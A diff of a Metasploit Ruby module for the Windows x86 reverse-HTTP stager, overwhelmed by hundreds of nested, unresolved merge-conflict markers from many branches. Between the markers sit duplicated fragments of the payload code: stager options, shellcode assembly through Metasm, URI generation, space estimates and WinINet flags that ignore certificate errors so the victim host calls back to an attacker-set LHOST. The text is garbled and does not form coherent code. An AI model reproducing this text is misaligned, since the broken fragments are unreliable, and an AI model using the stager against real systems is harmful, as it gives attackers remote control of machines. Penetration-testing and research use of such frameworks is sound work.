@@ -10,6 +10,7 @@ require 'msf/core'
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 =======
 >>>>>>> 4.11.2_release_pre-rails4
@@ -31,6 +32,43 @@ require 'msf/core'
 =======
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 >>>>>>> origin/pod/metasploit-framework
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+require 'msf/core/payload/windows/block_api'
+require 'msf/core/payload/windows/exitfunk'
+
+module Msf
+
+
+=======
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+>>>>>>> origin/pod/metasploit-gemfile-
 require 'msf/core/payload/transport_config'
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
@@ -38,6 +76,7 @@ require 'msf/core/payload/uuid/options'
 
 module Msf
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 =======
@@ -65,6 +104,15 @@ require 'msf/core/payload/windows/exitfunk'
 module Msf
 
 
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -118,6 +166,47 @@ module Msf
 >>>>>>> pod/metasploit-gemfile-
 >>>>>>> origin/pod/metasploit-framework
 =======
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+###
+#
+# Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
+#
+###
+
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -147,15 +236,26 @@ module Msf
 =======
 >>>>>>> pod/metasploit-gemfile-
 =======
+
+module Payload::Windows::ReverseHttp
+
+  include Msf::Payload::Windows::BlockApi
+  include Msf::Payload::Windows::Exitfunk
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-framework
 =======
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/payload-generator.rb
 =======
@@ -201,12 +301,60 @@ module Msf
 =======
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+=======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
 =======
 >>>>>>> master
 =======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+module Payload::Windows::ReverseHttp
+
+  include Msf::Payload::TransportConfig
+  include Msf::Payload::Windows
+  include Msf::Payload::Windows::BlockApi
+  include Msf::Payload::Windows::Exitfunk
+  include Msf::Payload::UUID::Options
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
@@ -217,10 +365,17 @@ module Msf
 =======
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
 >>>>>>> master
 =======
 >>>>>>> master
 =======
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> master
 >>>>>>> pod/metasploit-gemfile-
@@ -235,6 +390,16 @@ require 'msf/core/payload/uuid/options'
 
 module Msf
 
+=======
+>>>>>>> master
+
+  #
+  # Register reverse_http specific options
+  #
+  def initialize(*args)
+    super
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -261,6 +426,9 @@ module Msf
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 <<<<<<< HEAD
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -275,6 +443,15 @@ module Msf
 >>>>>>> origin/pod/metasploit-framework
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+    register_advanced_options(
+      [
+        OptInt.new('HTTPStagerURILength', [false, 'The URI length for the stager (5 to 240ish bytes)'])
+=======
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
@@ -284,6 +461,7 @@ module Msf
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -303,9 +481,18 @@ module Msf
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 =======
+=======
 >>>>>>> master
 =======
 >>>>>>> master
+=======
+>>>>>>> rapid7/master
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-framework
 =======
@@ -338,11 +525,55 @@ module Msf
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 =======
->>>>>>> master
 =======
 >>>>>>> master
 =======
 >>>>>>> master
+    register_advanced_options([
+        OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
+        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails', 10]),
+        OptString.new('PayloadProxyHost', [false, 'An optional proxy server IP address or hostname']),
+        OptPort.new('PayloadProxyPort', [false, 'An optional proxy server port']),
+        OptString.new('PayloadProxyUser', [false, 'An optional proxy server username']),
+        OptString.new('PayloadProxyPass', [false, 'An optional proxy server password']),
+        OptEnum.new('PayloadProxyType', [false, 'The type of HTTP proxy (HTTP or SOCKS)', 'HTTP', ['HTTP', 'SOCKS']])
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> pod/metasploit-gemfile-
 =======
@@ -362,6 +593,17 @@ module Msf
 #
 ###
 
+=======
+=======
+>>>>>>> master
+      ], self.class)
+  end
+
+  #
+  # Generate the first stage
+  #
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -406,6 +648,30 @@ module Payload::Windows::ReverseHttp
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
 =======
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+  def generate
+    # Generate the simple version of this stager if we don't have enough space
+    if self.available_space.nil? || required_space > self.available_space
+      return generate_reverse_http(
+        ssl:  false,
+        host: datastore['LHOST'],
+        port: datastore['LPORT'],
+        url:  "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW))
+    end
+
+    conf = {
+      ssl:  false,
+      host: datastore['LHOST'],
+      port: datastore['LPORT'],
+      url:  generate_uri,
+      exitfunk: datastore['EXITFUNC']
+    }
+
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 =======
 >>>>>>> rapid7/master
 =======
@@ -414,6 +680,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -436,12 +703,15 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 =======
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
 =======
 >>>>>>> master
 =======
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> rapid7/master
@@ -461,9 +731,17 @@ module Payload::Windows::ReverseHttp
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 >>>>>>> origin/pod/metasploit-framework
 =======
+>>>>>>> rapid7/master
+=======
 >>>>>>> master
 =======
 >>>>>>> master
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 =======
 >>>>>>> rapid7/master
 >>>>>>> origin/pod/metasploit-serialized_class_loader
@@ -511,6 +789,34 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+  def generate(opts={})
+    conf = {
+      ssl:         opts[:ssl] || false,
+      host:        datastore['LHOST'],
+      port:        datastore['LPORT'],
+      retry_count: datastore['StagerRetryCount']
+    }
+
+    # Add extra options if we have enough space
+    unless self.available_space.nil? || required_space > self.available_space
+      conf[:url]        = generate_uri
+      conf[:exitfunk]   = datastore['EXITFUNC']
+      conf[:ua]         = datastore['MeterpreterUserAgent']
+      conf[:proxy_host] = datastore['PayloadProxyHost']
+      conf[:proxy_port] = datastore['PayloadProxyPort']
+      conf[:proxy_user] = datastore['PayloadProxyUser']
+      conf[:proxy_pass] = datastore['PayloadProxyPass']
+      conf[:proxy_type] = datastore['PayloadProxyType']
+    else
+      # Otherwise default to small URIs
+      conf[:url]        = generate_small_uri
+    end
+
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -535,6 +841,9 @@ module Payload::Windows::ReverseHttp
 =======
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+<<<<<<< HEAD
+>>>>>>> origin/pod/metasploit-gemfile-
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
@@ -542,6 +851,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -551,6 +861,10 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 =======
+=======
+>>>>>>> rapid7/master
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
@@ -558,6 +872,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/payload-generator.rb
 =======
@@ -593,13 +908,16 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-framework
 =======
 =======
->>>>>>> master
+>>>>>>> origin/pod/metasploit-gemfile-
 =======
 >>>>>>> master
 =======
 >>>>>>> master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 =======
 >>>>>>> rapid7/master
 
@@ -636,6 +954,32 @@ module Payload::Windows::ReverseHttp
 =======
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+    generate_reverse_http(conf)
+  end
+
+  #
+  # Generate and compile the stager
+  #
+  def generate_reverse_http(opts={})
+    combined_asm = %Q^
+      cld                    ; Clear the direction flag.
+      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
+      #{asm_block_api}
+      start:
+        pop ebp
+      #{asm_reverse_http(opts)}
+    ^
+    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
+  end
+
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -665,6 +1009,15 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+  # TODO: Use the CachedSize instead (PR #4894)
+  def cached_size
+    321
+=======
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
@@ -672,6 +1025,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -693,6 +1047,11 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 =======
+=======
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
 >>>>>>> master
 =======
 >>>>>>> master
@@ -702,6 +1061,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> master
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 =======
 >>>>>>> master
@@ -737,6 +1097,17 @@ module Payload::Windows::ReverseHttp
         OptString.new('PayloadProxyPass', [false, 'An optional proxy server password']),
         OptEnum.new('PayloadProxyType', [false, 'The type of HTTP proxy (HTTP or SOCKS)', 'HTTP', ['HTTP', 'SOCKS']])
 <<<<<<< HEAD
+=======
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+  #
+  # Generate the transport-specific configuration
+  #
+  def transport_config(opts={})
+    transport_config_reverse_http(opts)
+>>>>>>> origin/pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -766,13 +1137,17 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 =======
->>>>>>> master
+>>>>>>> origin/pod/metasploit-gemfile-
 =======
 >>>>>>> master
 =======
 >>>>>>> master
+=======
+>>>>>>> master
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> pod/metasploit-gemfile-
 =======
@@ -803,6 +1178,20 @@ module Payload::Windows::ReverseHttp
   # Generate the first stage
   #
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+=======
+>>>>>>> master
+  end
+
+  #
+  # Generate the URI for the initial stager
+  #
+  def generate_uri
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -845,6 +1234,9 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -886,11 +1278,34 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> rapid7/master
 =======
->>>>>>> rapid7/master
+    # Maximum URL is limited to https:// plus 256 bytes, figure out our maximum URI
+    uri_max_len = 256 - "#{datastore['LHOST']}:#{datastore['LPORT']}/".length
+
+    if datastore['HTTPStagerURILength']
+      uri_req_len = datastore['HTTPStagerURILength'].to_i
+
+      if uri_req_len > uri_max_len
+        raise ArgumentError, "Maximum HTTPStagerURILength is #{uri_max_len}"
+      end
+
+      if uri_req_len < 5
+        raise ArgumentError, "Minimum HTTPStagerURILength is 5"
+      end
+
+      return "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW, uri_req_len)
+    end
+
+    # Generate a random 30+ byte URI
+    "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW, 30 + rand(uri_max_len-30))
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -910,6 +1325,11 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 =======
+=======
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> origin/pod/metasploit-gemfile-
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
@@ -921,11 +1341,15 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> master
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 =======
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 >>>>>>> master
 =======
 >>>>>>> master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 =======
@@ -967,6 +1391,28 @@ module Payload::Windows::ReverseHttp
     end
 
 <<<<<<< HEAD
+=======
+
+    uri_req_len = datastore['StagerURILength'].to_i
+
+    # Choose a random URI length between 30 and 255 bytes
+    if uri_req_len == 0
+      uri_req_len = 30 + rand(256-30)
+    end
+
+    if uri_req_len < 5
+      raise ArgumentError, "Minimum StagerURILength is 5"
+    end
+
+    generate_uri_uuid_mode(:init_native, uri_req_len)
+  end
+
+  #
+  # Generate the URI for the initial stager
+  #
+  def generate_small_uri
+    generate_uri_uuid_mode(:init_native, 5)
+>>>>>>> origin/pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -988,14 +1434,18 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 =======
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 >>>>>>> rapid7/master
 =======
 >>>>>>> master
 =======
 >>>>>>> master
 =======
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> rapid7/master
@@ -1008,9 +1458,15 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 >>>>>>> origin/pod/metasploit-serialized_class_loader
 =======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+>>>>>>> origin/pod/metasploit-gemfile-
+=======
 >>>>>>> master
 =======
 >>>>>>> master
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> pod/metasploit-gemfile-
 =======
@@ -1105,6 +1561,27 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 >>>>>>> pod/metasploit-gemfile-
 =======
+=======
+=======
+>>>>>>> master
+  end
+
+  #
+  # Determine the maximum amount of space required for the features requested
+  #
+  def required_space
+    # Start with our cached default generated size
+    space = cached_size
+
+    # Add 100 bytes for the encoder to have some room
+    space += 100
+
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1154,6 +1631,69 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+    # Add 251 bytes for large URI support (technically a little less, but lets go with it)
+    space += 251
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> rapid7/master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> rapid7/master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> rapid7/master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> rapid7/master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> rapid7/master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> rapid7/master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> rapid7/master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> master
+
+    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
+    space += 31
+
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1262,6 +1802,217 @@ module Payload::Windows::ReverseHttp
   #
   def generate_uri
 >>>>>>> origin/pod/metasploit-serialized_class_loader
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> rapid7/master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> rapid7/master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> rapid7/master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> rapid7/master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> rapid7/master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> rapid7/master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> rapid7/master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> master
+    # The final estimated size
+    space
+  end
+
+  #
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+  # Dynamic payload generation
+  #
+  def asm_reverse_http(opts={})
+
+    #
+    # options should contain:
+    #    ssl:     (true|false)
+    #    url:     "/url_to_request"
+    #   host:     [hostname]
+    #   port:     [port]
+    # exitfunk:   [process|thread|seh|sleep]
+    #
+
+    http_open_flags = 0
+
+    if opts[:ssl]
+        #;0x80000000 | ; INTERNET_FLAG_RELOAD
+        #;0x04000000 | ; INTERNET_NO_CACHE_WRITE
+        #;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION
+        #;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT
+        #;0x00000200 | ; INTERNET_FLAG_NO_UI
+        #;0x00800000 | ; INTERNET_FLAG_SECURE
+        #;0x00002000 | ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
+        #;0x00001000   ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+      http_open_flags = ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000 )
+    else
+      #;0x80000000 | ; INTERNET_FLAG_RELOAD
+      #;0x04000000 | ; INTERNET_NO_CACHE_WRITE
+      #;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION
+      #;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT
+      #;0x00000200   ; INTERNET_FLAG_NO_UI
+      http_open_flags = ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 )
+=======
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+=======
+>>>>>>> master
+  # Generate an assembly stub with the configured feature set and options.
+  #
+  # @option opts [Bool] :ssl Whether or not to enable SSL
+  # @option opts [String] :url The URI to request during staging
+  # @option opts [String] :host The host to connect to
+  # @option opts [Fixnum] :port The port to connect to
+  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
+  # @option opts [String] :proxy_host The optional proxy server host to use
+  # @option opts [Fixnum] :proxy_port The optional proxy server port to use
+  # @option opts [String] :proxy_type The optional proxy server type, one of HTTP or SOCKS
+  # @option opts [String] :proxy_user The optional proxy server username
+  # @option opts [String] :proxy_pass The optional proxy server password
+  # @option opts [Fixnum] :retry_count The number of times to retry a failed request before giving up
+  #
+  def asm_reverse_http(opts={})
+
+    retry_count   = [opts[:retry_count].to_i, 1].max
+    proxy_enabled = !!(opts[:proxy_host].to_s.strip.length > 0)
+    proxy_info    = ""
+
+    if proxy_enabled
+      if opts[:proxy_type].to_s.downcase == "socks"
+        proxy_info << "socks="
+      else
+        proxy_info << "http://"
+      end
+
+      proxy_info << opts[:proxy_host].to_s
+      if opts[:proxy_port].to_i > 0
+        proxy_info << ":#{opts[:proxy_port]}"
+      end
+    end
+
+    proxy_user = opts[:proxy_user].to_s.length == 0 ? nil : opts[:proxy_user]
+    proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : opts[:proxy_pass]
+
+    http_open_flags = 0
+    secure_flags = 0
+
+    if opts[:ssl]
+      http_open_flags = (
+        0x80000000 | # INTERNET_FLAG_RELOAD
+        0x04000000 | # INTERNET_NO_CACHE_WRITE
+        0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
+        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
+        0x00000200 | # INTERNET_FLAG_NO_UI
+        0x00800000 | # INTERNET_FLAG_SECURE
+        0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
+        0x00001000 ) # INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+
+      secure_flags = (
+        0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+        0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+        0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
+        0x00000100 | # SECURITY_FLAG_IGNORE_UNKNOWN_CA
+        0x00000080 ) # SECURITY_FLAG_IGNORE_REVOCATION
+    else
+      http_open_flags = (
+        0x80000000 | # INTERNET_FLAG_RELOAD
+        0x04000000 | # INTERNET_NO_CACHE_WRITE
+        0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
+        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
+        0x00000200 ) # INTERNET_FLAG_NO_UI
+>>>>>>> origin/pod/metasploit-gemfile-
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1344,6 +2095,47 @@ module Payload::Windows::ReverseHttp
 =======
 <<<<<<< HEAD
 >>>>>>> pod/metasploit-gemfile-
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
